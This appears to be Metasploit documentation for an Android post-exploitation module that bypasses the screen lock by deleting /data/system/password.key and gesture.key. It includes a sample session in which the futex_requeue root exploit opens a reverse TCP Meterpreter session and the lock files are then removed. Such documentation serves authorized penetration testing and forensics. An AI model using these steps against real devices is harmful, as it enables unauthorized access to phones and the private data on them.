## Description

  This module removes the screen lock data files to remove the unlock mechanism.  If the device
  still has a lock, the password will be blank.

  The file which are removed:

  * /data/system/password.key
  * /data/system/gesture.key

## Verification Steps

  1. Start msfconsole
  2. Get `shell` or `root` access on an Android device
  3. Do: ```use post/android/manage/remove_lock_root```
  4. Do: ```set session [session]```
  5. Do: ```run```
  6. You should be able to unlock the device without a password or gesture.

## Scenarios

### Samsung Galaxy S3 Verizon (SCH-I535 w/ android 4.4.2, kernel 3.4.0)

Utilizing futex_requeue to get root access.

  ```
msf5 exploit(android/local/futex_requeue) > run

[*] Started reverse TCP handler on 111.111.1.111:4444
[*] Using target: New Samsung
[*] Loading exploit library /data/data/com.metasploit.stage/files/cbvzt
[*] Loaded library /data/data/com.metasploit.stage/files/cbvzt, deleting
[*] Waiting 300 seconds for payload
[*] Sending stage (904600 bytes) to 222.222.2.222
[*] Meterpreter session 4 opened (111.111.1.111:4444 -> 222.222.2.222:58577) at 2019-10-22 16:04:31 -0400

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(android/local/futex_requeue) > use post/android/manage/remove_lock_root
msf5 post(android/manage/remove_lock_root) > set session 4
session => 4
msf5 post(android/manage/remove_lock_root) > run

[!] SESSION may not be compatible with this module.
[*] Removing /data/system/password.key
[*] Removing /data/system/gesture.key
[*] Device should be unlocked or no longer require a pin
[*] Post module execution completed
```
